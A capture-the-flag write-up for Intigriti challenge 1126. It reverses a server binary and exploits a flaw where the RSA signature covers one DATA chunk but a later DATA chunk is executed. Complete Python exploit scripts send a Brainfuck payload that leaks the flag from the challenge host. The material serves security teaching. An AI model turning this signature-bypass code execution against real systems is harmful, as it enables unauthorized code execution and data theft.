+++
title = 'Intigriti | Challenge 1126 Writeup'
date = 2026-11-25T00:00:00-01:00
draft = false
tags = ['Reverse']
description= "A super fast writeup for the super fast server x)"
+++

A Super Fast Writeup for the Super Fast Server challenge x) The latter encompassed both web and reverse with a signature bypass that allowed us to read `/the_real.flag` from a server that only executes RSA-2048 signed code.
    
## Exploit
### Recon

We land on a login page. Sending anything to `/login.html` returns a **`418 I'm a teapot`**, which is not a normal auth response, that's the server telling us *"this endpoint is a not really useful"*.

The changelog is our real recon target:

> **v2.0.1** - Added signups, **Added POST request parsing**.  
> **v2.0.0** - Fixed a path traversal, **Added a custom protocol, protected by a very good secret** to allow execution of RSA-2048 signed code.   
> **v1.0.0** - Initial public release.

And the docs, most importantly:

> The server serves files from the PWD.   
> **DON'T** Run the server binary in the PWD.

In other words, _the server binary is in the PWD and is downloadable, go reverse it._

We download the binary which we later reverse using Ghidra.
```sh
└─$ curl https://challenge-1126.challenges.intigriti.io/superfastserver -o superfastserver 
└─$ file superfastserver                                                                      
superfastserver: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d2c861447de60ff0a8cd9daf9a7e0cf2bf3499e0, for GNU/Linux 3.2.0, stripped
```
### Reversing 
Well, before getting into Ghidra details, a quick `strings` command on the binary allows us to read some anti-Ai strings (oki ^^) but also a `brainfuck` string, an Intigriti fake flag to be used locally (so okay, we note that we will probably be doing tests locally before running the final exploit on the target), and a _secret_ `SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033` showcased in the screenshot below :
![alt text](image-1.png)


Now, Ghidra.   
Three functions matter out of the whole binary.
- **`FUN_00107690` : HTTP listener on `0x1f90 = 8080`.** It spawns `FUN_00106d90` per connection.
- **`FUN_00106840` : custom-protocol listener on `0x1389 = 5001`.** It calls `FUN_00105cb0` per connection and the only one that can read the flag.
- **`FUN_00106d90` : the HTTP handler** and the most important function for us which can be summed up as follows (or at least I think so x)):
    ![alt text](image-3.png)
    - `GET /` redirects to `/index.html`
    - `GET /<file>` serves files if they exist and offers a directory traversal thanks to `fopen(basename(path))`
    - `POST /custom_protocol` is a **raw TCP proxy** to `127.0.0.1:5001`. The body after `\r\n\r\n` is forwarded verbatim then a single `read(0x2000)` is pushed back:

        ```c
        pcStack_111c0 = strstr(buf, "\r\n\r\n") + 4;
        sStack_111c8 = lStack_10030 - (pcStack_111c0 - buf);
        iStack_111cc = socket(2,1,0);
        connect(iStack_111cc, 127.0.0.1:5001);
        send(iStack_111cc, pcStack_111c0, sStack_111c8, 0);
        sleep(2);
        read(iStack_111cc, auStack_131e8, 0x2000);
        FUN_00106b40(fd, "200 OK", "text/html", auStack_131e8, n, 0);
        ```    
    - Any other `POST` gives `418 I'm a teapot`. So indeed, the login page was just a _placeholder_.

    Our remote entrypoint is `POST /custom_protocol` on 443 and the protocol bytes become the HTTP body.

- **`FUN_00105cb0`: the custom protocol**
![alt text](image-7.png)
    - 106-byte handshake with the super secret then `'w' + u32(len) + cmd + payload` framing
    - Commands: `CODE`, `DATA`, `SIGN`, `EXEC`, `HELP`, `PING`, `1337`
    - `CODE` mmaps RWX and copies the payload there
    - `DATA` records `[offset, length]` and is overwritten every time we send a `DATA` chunk
    - `SIGN` records `[offset, length]`
    - `EXEC` can be rewritten as below :

    ```C
    if (cmd == EXEC) {
        if (sig_offset  == UNSET) { send("NOSIG");  break; }
        if (code_offset == UNSET) { send("NOCODE"); break; }
        if (data_offset <  code_offset) { send("DATA BEFORE CODE"); break; }

        // hash
        sha256(inbuf + code_offset,
                code_length + data_length,
                computed_hash);

        // RSA-2048 verify
        hex_decode(modulus_hex, modulus, 0x100);
        rsa_verify(&exp_65537, modulus, 0x800,
                inbuf + sig_offset, // ← SIGN chunk
                recovered_digest);

        // compare + execute
        if (rsa_out_len == 32 && memcmp(recovered_digest, computed_hash, 32) == 0) {
            code_page(inbuf + data_offset, // ← LAST DATA   (executed)
                    fs_base - 0x160, 
                    exit_callback);
        } else {
            send("BADSIG");
        }
    }
    ```

Here, we observe two issues : 
- First, as DATA overwrites the chunk with each `DATA` received, this entails that if we send : 
    1. `CODE`: `code_offset` = 0, `code_length` = C
    2. `DATA`: `data_offset` = C, `data_length` = D
    3. `DATA`: `data_offset` = C + D, `data_length` = D ← overwritten  
    If we leave it here, it can be fine but the real issue is the following.
- In `EXEC` (to use it we need to send `CODE`, then `DATA`, then `SIGN`, then `EXEC`): 
    - On one side, `HASH` starts at start of `CODE` (`inbuf + code_offset`) and covers `CODE || len(last_DATA)` bytes, in other words, `code_length + data_length`.
    - On the flip side, the execution pointer of `EXEC` starts at the start of last `DATA` (`inbuf + data_offset`). 
    
Combining these two elements, and as the data_length is not updated when several `DATA` chunks are received, if we send `CODE`, then `DATA1` (signed), then `DATA2` of the same length, the hash still verifies `CODE || DATA1` but the shellcode runs `DATA2`. That will allow us to execute our code on the server.

![alt text](image-5.png)


Nevertheless, to achieve that, we first need a signed code as we do not have the private key. 

Let's try to interact with the binary to see what the command `HELP` yields.

### Local setup

We run the binary locally :

```shell
└─$ echo "INTIGRITI{THIS_IS_A_FAKE_FLAG_USE_IT_TO_SOLVE_LOCALLY_THEN_REPLAY_TO_THE_SERVER}" > the_real.flag
└─$ ./superfastserver
[140435406268096] HTTP server listening on port 8080
[140435397875392] custom protocol server listening on port 5001
```

And we use the following script to send the command `HELP` :
```py
import socket, struct

HOST, PORT = "localhost", 8080
HANDSHAKE = b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"

def cmd(name, data=b""):
    return b"w" + struct.pack("<I", len(data)) + name + data

## send HELP 
payload = HANDSHAKE + cmd(b"HELP")
s = socket.create_connection((HOST, PORT))
s.sendall(
    f"POST /custom_protocol HTTP/1.1\r\nHost: {HOST}\r\n"
    f"Content-Length: {len(payload)}\r\nConnection: close\r\n\r\n".encode() + payload
)

body = b"".join(iter(lambda: s.recv(65536), b"")).partition(b"\r\n\r\n")[2]
s.close()

print(body)
```
This yields this output which is not really readable x)
![alt text](image-8.png)

Hence, we add some parsing to correctly understand what we have by including the following code to our original script: 
```py
# We #first check our handshake worked
assert body.startswith(b"ACK\x00"), body[:16]
blob = body[4:]

print(f"ACK, blob = {len(blob)} bytes\n")

## parsing chunks: 'w' + u32(payload+4) + cmd + payload 
# n.b : 'w' (1B) + L (4B, u32) + name (4B) + payload (L# - 4B)

i = 0
while i + 9 <= len(blob) and blob[i:i+1] == b"w":
    L = struct.unpack("<I", blob[i+1:i+5])[0]        
    name, data = blob[i+5:i+9], blob[i+9:i+5+L]
    if name == b"DATA":                                
        print(f"{name.decode():5s} ({len(data)})  {data}")
    else:                                              
        print(f"{name.decode():5s} ({len(data)})  {data.hex()}")
    i += 5 + L
```

Running our edited code yields the following : 
```text
ACK, blob = 1112 bytes

CODE  (396)  554889e54883ec4048897df8488975f0488955e848894de0488b45f0488945d848c745c800000000488b45f8488b4dc80fbe040883f8000f8449010000488b45f8488b4dc88a04088845d70fbe45d783f83e7511488b45d84883c001488945d8e90e0100000fbe45d783f83c7511488b45d84883c0ff488945d8e9f20000000fbe45d783f82b7510488b45d88a0880c1018808e9d70000000fbe45d783f82d7510488b45d88a0880c1ff8808e9bc0000000fbe45d783f82e7512488b45e8488b4dd80fbe39ffd0e99f0000000fbe45d783f82c7512b000ff55e088c1488b45d88808e9820000000fbe45d783f85b7505e9800000000fbe45d783f85d7567488b45d80fb60083f800745b48c745c00100000048837dc000764a488b45f8488b4dc84889ca4883c2ff488955c88a4408ff8845d70fbe45d783f85b750e488b45c04883c0ff488945c0eb170fbe45d783f85d750c488b45c04883c001488945c0eb00ebafeb00eb00eb00eb00eb00eb00eb00eb00eb00488b45c84883c001488945c8e9a2feffff4883c4405dc3
DATA  (424)  b'-[------->+<]>.-[->++++<]>.-[--->++<]>--.+++++++.+.-----------.--[--->+<]>-.--[->++++<]>+.----------.++++++.-[---->+<]>+++.++[--->++<]>.---.++.------.--[--->+<]>-.---[->++++<]>.------------.+.++++++++++.+[---->+<]>+++.---[->++++<]>-.----.[--->+<]>-----.++[->+++<]>.-----.--[--->+<]>---.++[++>---<]>.++[--->++<]>.--[-->+++++<]>.[--->++++<]>+..+++++++++++.[------->++<]>.++[->+++<]>+.++++++++.------.+++++.-------.-[--->+<]>-.'
SIGN  (256)  66fa7f4d3eac26376ff07602cd2f93b4450fec250138a1206e2a2a6273fa472fdedd9170957559fc628d27feb6420100a962bf1f6ff1a5c355fc457379752e4611bd1f941832370aad9048049b0e7bd25328856704d7e56a0dfbc44c1ff02d64c8f35e128852e77533a54347e3ba93fe3fbd256e702a987dec6093709daa0b82b9126d6a9b0c8940736ea65722efa28212501061ef441037d11789e4a7813b003bc4164e340ae84356c53ea94a6768996451956a99294a518fe1f90d725b907f70a5bc9dca56659d87bdadfc06e31978e0cdd3594f7e48ab83e64b78d59ad24245bacdbdc0f8d610115d9f2c786d8384d5e2efd74d72c279ed02af61ddf48ac0
EXEC  (0) 
```

We observe that the `HELP` command returns a complete signed blob with a valid `CODE + DATA + SIGN` triplet (which is exactly what we needed). 

Also, we observe that brainfuck string in the received data which we decode via [brainfuck.net](https://brainfuck.net/) to obtain the following : 

![alt text](image.png)

Honest answer : So far, yes ^^ but most importantly, this should mean that the interpreter is a Brainfuck VM x)

At this point, we basically have all the elements to construct our exploit which would be as follows: 
- We extract the valid signed blob of `CODE + DATA` from the `HELP` command demo output
- We write our payload in brainfuck
- We build our payload with :
    - `CODE`: server mmaps it and sets `code_offset` = 0
    - 1st `DATA` which is the signed one, i.e. the hash target, 
    - 2nd `DATA` which is our Brainfuck (same length as 1st DATA) and will be executed
    - `SIGN` that is the pre-signed signature from `HELP`
    - `EXEC`

One last detail : constructing our payload. 
Our flag sits in `fs_base-0x60` (part which we did not yet ention about `FUN_00105cb0` but showcased in the following). Indeed,  given that `in_FS_OFFSET` is the `fs_base` below, `FUN_00105cb0` first reads the flag into the buffer `local_78` then copies its content to `fs_base - 0x60`: 
```c
local_20 = fopen("/the_real.flag","r");
if (local_20 != (FILE *)0x0) {
    memset(&local_78,0,0x51);
    fread(&local_78,1,0x51,local_20);       // read flag into buffer local_78
    fclose(local_20);

    // copy 81 bytes to fs_base - 0x60" (one slot at a time)
    *(undefined1 *)(in_FS_OFFSET + -2) = local_28;   // fs_base - 0x10 : flag[80]
    in_FS_OFFSET[-4] = local_38;                     // fs_base - 0x20
    in_FS_OFFSET[-3] = lStack_30;                    // fs_base - 0x18
    in_FS_OFFSET[-6] = local_48;                     // fs_base - 0x30
    in_FS_OFFSET[-5] = lStack_40;                    // fs_base - 0x28
    in_FS_OFFSET[-8] = local_58;                     // fs_base - 0x40
    in_FS_OFFSET[-7] = lStack_50;                    // fs_base - 0x38
    in_FS_OFFSET[-10] = local_68;                    // fs_base - 0x50
    in_FS_OFFSET[-9] = lStack_60;                    // fs_base - 0x48
    in_FS_OFFSET[-0xb] = lStack_70;                  // fs_base - 0x58
    in_FS_OFFSET[-0xc] = local_78;                   // fs_base - 0x60 : flag[0]

}
```
(Note that in Ghidra's syntax, `in_FS_OFFSET[-N]` corresponds to 8 bytes at `fs_base - 8xN`, for instance `in_FS_OFFSET[-0xc]` matches `fs_base - 12*8`. Moreover, `in_FS_OFFSET + -2 (undefined1)` corresponds to one byte at `fs_base - 0x10`)

As the calling convention is the following, the start of the brainfuck byte array which will be executed should be the `fs_base-0x160`.
```c
(*local_4c8)(local_24c8 + local_4a8,          // arg1 = data pointer
             *in_FS_OFFSET + -0x160,          // arg2 = fs_base-0x160
             FUN_00105c30);                   // arg3 = exit callback

// equivalent to the earlier 
// code_page(inbuf + data_offset, 
//         fs_base - 0x160, 
//         exit_callback);
```

Hence, as our goal is printing the flag, so `fs_base-0x60` to `fs_base-0x10`, we should move our pointer to `fs_base-0x60` and print the characters one by one. So simple math, we would need to move our pointer `(fs_base-0x60)-(fs_base-0x160)=0x160-0x60=0x100=256 bytes` forward, then print the characters one at a time. 

> Small Brainfuck reminder :  
>    `>` : pointer+=1   
>    `.` : output the byte at array[pointer]

Hence, in our case, we will have 256 `>` ( to point to `flag[0]` followed by 80 `.>` to print each flag byte with a final `.` for the last one. 

Let's construct our final payload. 

## PoC

We will first test our exploit locally using the python code below: 
```python
import socket, struct, re

HOST, PORT = "localhost", 8080
HANDSHAKE = b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"

def cmd(name, data=b""):
    return b"w" + struct.pack("<I", len(data)) + name + data

def send(stream):
    s = socket.create_connection((HOST, PORT))
    s.sendall(
        f"POST /custom_protocol HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Length: {len(stream)}\r\nConnection: close\r\n\r\n".encode() + stream
    )
    body = b"".join(iter(lambda: s.recv(65536), b"")).partition(b"\r\n\r\n")[2]
    s.close()
    return body

## send HELP 
body = send(HANDSHAKE + cmd(b"HELP"))
assert body.startswith(b"ACK\x00"), body[:16]
blob = body[4:]

## 'w' + u32(L) + name(4) + payload(L - 4)
chunks, i = {}, 0
while i + 9 <= len(blob) and blob[i:i+1] == b"w":
    L = struct.unpack("<I", blob[i+1:i+5])[0]
    name, data = blob[i+5:i+9], blob[i+9:i+5+L]
    chunks[name] = data
    i += 5 + L

## extracting code, 1st DATA and the valid signature
code, data1, sign = chunks[b"CODE"], chunks[b"DATA"], chunks[b"SIGN"]


## 2nd DATA : 256 '>' + '.>' x 80 + '.' + padding to len(1st DATA) with '>' (so the hash span = len(1st DATA))
data2 = (b">" * 256 + b".>" * 80 + b".").ljust(len(data1), b">")[:len(data1)]

## payload: CODE | DATA1(signed) | DATA2(executed) | SIGN | EXEC
body = send(
    HANDSHAKE
    + cmd(b"CODE", code)
    + cmd(b"DATA", data1)
    + cmd(b"DATA", data2)
    + cmd(b"SIGN", sign)
    + cmd(b"EXEC")
)
print(f"\nresponse: {body!r}")
```
The latter yields 5 `ACK` followed by our fake flag: 
```text
response: b'ACK\x00ACK\x00ACK\x00ACK\x00ACK\x00INTIGRITI{THIS_IS_A_FAKE_FLAG_USE_IT_TO_SOLVE_LOCALLY_THEN_REPLAY_TO_THE_SERVER}\x00'                                     
```

Finally, let's change our host to `challenge-1126.challenges.intigriti.io` and set our port to 443 alongside including the required SSL changes in the `send` function which becomes
```python
HOST, PORT = "challenge-1126.challenges.intigriti.io", 443

def send(stream):
    s = socket.create_connection((HOST, PORT))
    if PORT == 443:
        s = ssl.create_default_context().wrap_socket(s, server_hostname=HOST)
    s.sendall(
        f"POST /custom_protocol HTTP/1.1\r\nHost: {HOST}\r\n"
        f"Content-Length: {len(stream)}\r\nConnection: close\r\n\r\n".encode() + stream
    )
    body = b"".join(iter(lambda: s.recv(65536), b"")).partition(b"\r\n\r\n")[2]
    s.close()
    return body
```
This should do the following : 
![thumbnail](image-10.png)

Running our updated code yields the flag (minus the 1st `I` of Intigriti x) but that should be fixed by changing the 256 `>` to 255): 
![alt text](image-9.png)

Finally, our flag is **`INTIGRITI{4c0532a9-f169-4a5d-ae02-a8b0671d2b07}`**